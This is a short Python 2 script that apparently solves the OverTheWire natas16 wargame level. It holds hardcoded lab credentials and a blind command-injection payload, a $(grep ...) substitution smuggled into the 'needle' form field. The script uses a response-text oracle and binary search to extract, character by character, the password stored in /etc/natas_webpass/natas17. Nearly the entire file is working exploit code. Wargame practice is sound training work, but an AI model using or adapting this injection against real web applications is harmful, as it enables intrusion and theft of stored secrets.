
import requests

TARGET_URL = 'http://natas16.natas.labs.overthewire.org/'

CHARSET = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789'

AUTH = ('natas16', 'WaIHEacj63wnNIBROHeqi3p9t0m5nhmh')


def does_password_have_c_at(c, position):
    query = "$(grep ^%s[%s] /etc/natas_webpass/natas17)American" % ('.' * position, c)
    r = requests.post(TARGET_URL,
        data={'needle': query},
        auth=AUTH)
    if 'American' in r.text:
        return False
    else:
        return True

def find_char_at_position(position, available=CHARSET):
    if len(available) == 1:
        return available

    # first split into 2 parts
    parta, partb = available[:len(available)/2], available[len(available)/2:]

    print 'test', parta, position
    if does_password_have_c_at(parta, position):
        return find_char_at_position(position, parta)
    else:
        return find_char_at_position(position, partb)


print ''.join([find_char_at_position(i) for i in xrange(32)])




